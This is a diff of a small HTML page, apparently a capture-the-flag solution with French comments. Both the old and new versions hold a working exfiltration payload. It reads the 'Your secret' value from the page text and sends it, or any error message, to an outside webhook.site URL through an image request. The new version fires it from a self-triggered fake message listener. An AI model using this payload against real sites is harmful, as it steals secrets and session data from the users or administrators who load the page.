@@ -1,23 +1,26 @@
 <html>
 <script>
-// Optionnel : simuler une popup pour le style CTF
-var win = window.open("", "_blank"); // ouvre une popup vide
+// Simuler l'ouverture d'une popup pour rester dans le style CTF
+var win = window.open("", "_blank"); // popup vide, même origine
 
-// Fonction pour exfiltrer le secret
-function exfiltrate() {
-    try {
-        // Récupérer le texte de la page courante (admin)
-        var secret = document.body.innerText.match(/Your secret:\s*([^\n]+)/)[1];
-
-        // Envoyer au webhook
-        new Image().src = "https://webhook.site/22146e19-1f74-4218-9ba1-ba5519e2ee77?secret=" + encodeURIComponent(secret);
-    } catch(e) {
-        // Si erreur, envoyer le message d'erreur
-        new Image().src = "https://webhook.site/22146e19-1f74-4218-9ba1-ba5519e2ee77?error=" + encodeURIComponent(e.message);
+// Installer un "listener" simulé
+window.addEventListener('message', function(event) {
+    // Ici on ne reçoit rien, mais pour respecter le format
+    if (true) { // on accepte tout pour déclencher l'exfiltration
+        try {
+            // Récupérer le secret dans le document de la page courante
+            var secret = document.body.innerText.match(/Your secret:\s*([^\n]+)/)[1];
+            // Exfiltrer vers le webhook
+            new Image().src = 'https://webhook.site/22146e19-1f74-4218-9ba1-ba5519e2ee77?secret=' + encodeURIComponent(secret);
+        } catch(e) {
+            new Image().src = 'https://webhook.site/22146e19-1f74-4218-9ba1-ba5519e2ee77?error=' + encodeURIComponent(e.message);
+        }
     }
-}
+});
 
-// Exécuter après un petit délai pour que la page soit chargée
-setTimeout(exfiltrate, 1000);
+// Déclencher le listener après un petit délai
+setTimeout(function() {
+    window.dispatchEvent(new MessageEvent('message', {data: 'trigger'}));
+}, 500);
 </script>
 </html>
